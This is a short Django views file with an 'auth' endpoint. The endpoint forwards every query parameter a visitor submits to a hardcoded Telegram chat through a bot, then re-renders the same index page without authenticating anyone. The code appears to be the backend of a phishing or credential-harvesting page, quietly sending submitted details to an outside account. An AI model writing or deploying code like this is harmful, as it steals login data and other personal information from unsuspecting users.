import asyncio
import os

import telegram.ext
from django.shortcuts import render
from dotenv import load_dotenv
load_dotenv()
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN')

def index(request):
    return render(request, 'index.html')


def auth(request):
    bot = telegram.Bot(token=TELEGRAM_TOKEN)
    asyncio.run(bot.send_message(124987663, request.GET))
    return render(request, 'index.html')
